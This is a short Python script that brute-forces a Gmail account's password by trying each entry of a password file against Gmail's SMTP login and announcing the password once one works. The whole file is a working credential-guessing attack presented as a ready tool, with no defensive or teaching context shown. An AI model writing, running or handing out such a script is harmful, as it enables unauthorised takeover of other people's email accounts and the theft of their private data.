#!/usr/bin/python3

import smtplib
from termcolor import colored

smtpserver = smtplib.SMTP('smtp.gmail.com',587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("Enter The Target Gmail: ")
print (user)
#passwd = str(input("[*] Enter The Password File Path:"))
file = open('passwd.txt','r')

for password in file:
	passwd = password.strip('\n')
	try:
		smtpserver.login(user,passwd)
		print (colored("[+] Password Found:%s" % (passwd),'green'))
		break
	except smtplib.SMTPAuthenticationError:
		print (colored("[-] Wrong password : %s " % (passwd),'green'))

	#print ("[-] Password Not Found")
